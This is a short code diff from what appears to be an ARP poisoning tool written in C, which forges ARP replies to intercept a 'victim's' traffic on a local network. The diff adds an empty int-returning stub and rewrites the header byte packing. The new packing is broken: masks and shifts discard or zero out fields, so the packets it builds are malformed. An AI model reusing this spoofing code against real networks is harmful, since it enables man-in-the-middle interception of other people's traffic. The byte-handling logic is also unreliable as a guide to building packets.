@@ -60,7 +60,9 @@ void handle_arp_request(const struct pkt_arp * packet) {
         printf("Packet not from victim. Discard.\n");
     }
 }
-
+int arp_poison_pkt(const struct pkt_arp * packet) {
+    
+}
     int
 arp_poison (const struct pkt_arp * packet )
 {
@@ -79,12 +81,10 @@ arp_poison (const struct pkt_arp * packet )
     //cpy in one pass htype,ptype,hard_len,proto_len
     //memcpy(bytes+offset,packet,6);
     //offset += 6;
-    bytes[offset] = htons(packet->htype);
-    offset += 2;
-    bytes[offset] = htons(packet->ptype);
-    offset += 2;
-    bytes[offset++] = packet->hard_addr_len;
-    bytes[offset++] = packet->proto_addr_len;
+    bytes[offset++] = htons(packet->htype) & 0xff;
+    bytes[offset++] = (htons(packet->ptype) >> 8) & 0xff;
+    bytes[offset++] = htons(packet->hard_addr_len) & 0xff;
+    bytes[offset++] = (htons(packet->proto_addr_len) << 8) & 0xff;
 
     // code reply
     bytes[offset]  = htons(ARPOP_REPLY);
